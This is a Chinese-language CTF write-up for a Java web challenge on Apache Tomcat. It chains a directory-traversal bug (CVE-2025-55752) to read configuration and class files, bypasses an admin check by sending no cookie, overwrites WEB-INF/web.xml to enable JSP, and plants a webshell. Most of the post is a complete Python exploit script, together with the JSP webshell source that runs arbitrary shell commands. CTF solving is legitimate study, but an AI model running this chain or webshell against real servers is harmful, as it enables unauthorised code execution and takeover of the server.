---
title: pcb5-ez_java
published: 2025-12-15
description: pcb5-ez_java
tags: [比赛]
category: java
draft: false
---

# pcb5-ez_java

打开示例又是一个登录框，admin被占用就用Admin注册

成功登录

根据前面题目的经验，打开cookie发现是jwt编码

![image](./../../../public/pcb5-ez_java/3568664-20251215165848806-1721264182.png)


将Admin改为admin编码

``eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc2NTYyMjE4M30.uqlZpRIPHzHnA45-ddAwJwLT1Ga6an55bsBk2tMlvckXWETrXM3jM5jrG4kKdI-zFhn6GOVUQCV1IkdDlFwsrQ``

奇怪的来了，后台显示未经授权

![image](./../../../public/pcb5-ez_java/3568664-20251215175531562-564852132.png)

好在这里报错爆出了apache服务器和版本Apache Tomcat/9.0.108

根据提示

> RewriteCond %{QUERY_STRING} (^|&)path=([^&]+) RewriteRule ^/download$ /%2 [B,L]

发现这里存在``CVE-2025-55752``，也就是``Apache Tomcat RewriteValve目录遍历漏洞``

https://blog.csdn.net/AKM4180/article/details/154134981

访问web.xml文件：``/download?path=%2fWEB-INF%2fweb.xml``，得到

![image](./../../../public/pcb5-ez_java/3568664-20251215175552135-1045417985.png)

这里有好几个servlet，我们先读取AdminDashboardServlet

http://192.168.18.25:25004/download?path=%2FWEB-INF%2Fclasses%2Fcom%2Fctf%2FBackUpServlet.class

得到一个download，将源码反编译得到

![image](./../../../public/pcb5-ez_java/3568664-20251215175600548-925904754.png)


其中``validateAdmin``方法存在逻辑漏洞：

```java
    static boolean validateAdmin(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Cookie[] cookies = req.getCookies();
        if (cookies != null) {
            for(Cookie cookie : cookies) {
                if ("jwt".equals(cookie.getName())) {
                    String value = cookie.getValue();
                    String username = JwtUtil.validateToken(value);
                    if (username == null) {
                        resp.sendError(401);
                        return false;
                    }

                    if (username.compareTo("admin") != 0) {
                        resp.sendError(401);
                        return false;
                    }
                }
            }
        }

        resp.setContentType("application/json;charset=UTF-8");
        return true;
    }
```

这段代码代表当**不携带任何 Cookie** 时，将会执行``return true``操作，也就是不携带cookie即可访问``/admin/``路由下所有接口

浏览器并未开启jsp解析服务，所以我们要上传包含``JspServlet``的恶意``web.xml``配置，覆盖带原有`WEB-INF/web.xml`，使服务器能够解析我们的恶意jsp文件（webshell)

其中`renameFile`方法的`getCanonicalFile`对文件路径进行检测，解析掉所有的"."和".."

```java
File base = (new File(this.getServletContext().getRealPath(resourceDir))).getCanonicalFile();
```

所以我们需要将resourceDir设置为"."，然后通过`/admin/rename`将上传的恶意web.xml改为WEB-INF/web.xml

Tomcat检测到新的web.xml会自动重载应用，上传我们的jsp webshell即可执行命令

```java
import requests
import time
import sys

# ================= 配置区域 =================
URL = "http://192.168.18.25:25004"
CMD_TO_EXECUTE = "cat /flag"  # 获取 flag 的命令
PROXY = None # {"http": "http://127.0.0.1:8080"}  # 如果需要 Burp 调试，取消注释

# ================= Payload 构造 =================

# 1. 恶意的 web.xml (修正版：包含原有业务配置)
# 作用：在保留原有上传/管理功能的基础上，强行开启 JSP 解析
MALICIOUS_WEB_XML = """<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

  <servlet>
      <servlet-name>jsp</servlet-name>
      <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
      <init-param>
          <param-name>fork</param-name>
          <param-value>false</param-value>
      </init-param>
      <init-param>
          <param-name>xpoweredBy</param-name>
          <param-value>false</param-value>
      </init-param>
      <load-on-startup>3</load-on-startup>
  </servlet>
  <servlet-mapping>
      <servlet-name>jsp</servlet-name>
      <url-pattern>*.jsp</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>com.ctf.LoginServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>RegisterServlet</servlet-name>
    <servlet-class>com.ctf.RegisterServlet</servlet-class>
  </servlet>
  
  <servlet>
    <servlet-name>DashboardServlet</servlet-name>
    <servlet-class>com.ctf.DashboardServlet</servlet-class>
    <multipart-config>
      <max-file-size>10485760</max-file-size>
      <max-request-size>20971520</max-request-size>
      <file-size-threshold>0</file-size-threshold>
    </multipart-config>
  </servlet>
  
  <servlet>
    <servlet-name>AdminDashboardServlet</servlet-name>
    <servlet-class>com.ctf.AdminDashboardServlet</servlet-class>
    <multipart-config>
      <max-file-size>10485760</max-file-size>
      <max-request-size>20971520</max-request-size>
      <file-size-threshold>0</file-size-threshold>
    </multipart-config>
  </servlet>
  
  <servlet>
    <servlet-name>BackUpServlet</servlet-name>
    <servlet-class>com.ctf.BackUpServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/login</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>RegisterServlet</servlet-name>
    <url-pattern>/register</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>DashboardServlet</servlet-name>
    <url-pattern>/dashboard/*</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>AdminDashboardServlet</servlet-name>
    <url-pattern>/admin/*</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>BackUpServlet</servlet-name>
    <url-pattern>/backup/*</url-pattern>
  </servlet-mapping>

  <welcome-file-list>
    <welcome-file>index.html</welcome-file>
  </welcome-file-list>
</web-app>
"""

# 2. JSP Webshell (增强版：支持标准输出和错误输出)
JSP_SHELL = r"""<%@ page import="java.io.*,java.util.*" %>
<pre>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        // 使用 /bin/sh -c 兼容管道符和复杂命令
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        InputStream in = p.getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        
        InputStream err = p.getErrorStream();
        Scanner sErr = new Scanner(err).useDelimiter("\\A");
        String error = sErr.hasNext() ? sErr.next() : "";
        
        out.println(output + error);
    }
%>
</pre>"""

# ================= 工具函数 =================

def set_resource_dir(path):
    """利用 Auth Bypass 设置 resourceDir 为 WebRoot"""
    print(f"[*] Setting ResourceDir to: {path}")
    try:
        # 关键：不带 cookies 触发 Auth Bypass
        r = requests.post(f"{URL}/admin/challengeResourceDir", 
                          data={"new-path": path},
                          proxies=PROXY)
        if r.status_code == 200:
            print("[+] ResourceDir set successfully.")
            return True
        else:
            print(f"[-] Failed to set ResourceDir: {r.status_code} - {r.text}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def upload_file(filename, content):
    """模拟文件上传，目标接口通常是 /dashboard/upload 或 /admin/upload"""
    print(f"[*] Uploading/Writing file: {filename}")
    try:
        files = {'file': (filename, content)}
        # 尝试使用 dashboard upload，如果失败可以换 /admin/upload
        upload_url = f"{URL}/dashboard/upload" 
        # upload_url = f"{URL}/admin/upload" # 备用接口
        
        r = requests.post(upload_url, files=files, proxies=PROXY)
        
        if r.status_code == 200:
            print(f"[+] File {filename} uploaded.")
            return True
        else:
            # 有时候虽然报 500 或其他错，但文件其实写进去了，检查一下
            print(f"[-] Upload status: {r.status_code}. Checking file existence...")
            check = requests.get(f"{URL}/{filename}", proxies=PROXY)
            if check.status_code == 200:
                print(f"[+] Check passed: {filename} exists on server.")
                return True
            return False
    except Exception as e:
        print(f"[-] Upload Error: {e}")
        return False

def rename_file(old_path, new_path):
    """利用 rename 接口移动/覆盖文件"""
    print(f"[*] Renaming {old_path} -> {new_path}")
    try:
        r = requests.post(f"{URL}/admin/rename", 
                          data={"oldPath": old_path, "newName": new_path},
                          proxies=PROXY)
        # 检查返回内容确认是否成功
        if r.status_code == 200 and ('"renamed":true' in r.text or 'true' in r.text):
            print("[+] Rename successful.")
            return True
        else:
            print(f"[-] Rename failed: {r.text}")
            return False
    except Exception as e:
        print(f"[-] Rename Error: {e}")
        return False

def execute_cmd(shell_name, cmd):
    print(f"[*] Executing command: {cmd}")
    try:
        target = f"{URL}/{shell_name}"
        r = requests.get(target, params={"cmd": cmd}, proxies=PROXY)
        if r.status_code == 200:
            print("\n" + "="*20 + " OUTPUT " + "="*20)
            print(r.text.strip())
            print("="*48 + "\n")
        else:
            print(f"[-] Execution failed: {r.status_code}")
    except Exception as e:
        print(f"[-] Exec Error: {e}")

# ================= 主流程 =================

def main():
    print("[*] Starting Exploitation...")
    
    # 1. 设置 ResourceDir 为 WebRoot (.)
    # 这是所有文件操作的前提，打破目录限制
    if not set_resource_dir("."):
        return

    # 2. 上传包含完整配置的恶意 web.xml
    # 先传为临时文件，防止直接覆盖出错
    temp_xml_name = "pwn_web.xml"
    if not upload_file(temp_xml_name, MALICIOUS_WEB_XML):
        print("[-] Aborting: Failed to upload web.xml content.")
        return

    # 3. 覆盖 WEB-INF/web.xml
    # 这一步会触发 Tomcat 重载
    if not rename_file(temp_xml_name, "WEB-INF/web.xml"):
        print("[-] Aborting: Failed to overwrite web.xml.")
        return

    # 4. 等待 Tomcat 重载配置 (Reload Context)
    print("[*] Waiting 15 seconds for Tomcat to reload configuration...")
    time.sleep(15)

    # 5. 【重要补刀】重载后，ResourceDir 变量可能会重置回默认值
    # 所以为了保险，我们再次将其设置为 "."，确保后续上传的 shell 能被正确 rename
    print("[*] Re-setting ResourceDir to . after reload...")
    set_resource_dir(".")

    # 6. 上传并部署 JSP Shell
    # 先传为 txt 绕过可能存在的后缀检查（虽然 web.xml 已经放行了，但稳健为主）
    temp_shell_name = "shell.txt"
    final_shell_name = "shell.jsp"
    
    if not upload_file(temp_shell_name, JSP_SHELL):
        print("[-] Failed to upload shell content.")
        return
    
    if not rename_file(temp_shell_name, final_shell_name):
        print("[-] Failed to rename shell to .jsp.")
        return

    # 7. 执行命令获取 Flag
    print("[+] Exploit chain completed! Testing RCE...")
    execute_cmd(final_shell_name, CMD_TO_EXECUTE)

if __name__ == "__main__":
    main()
```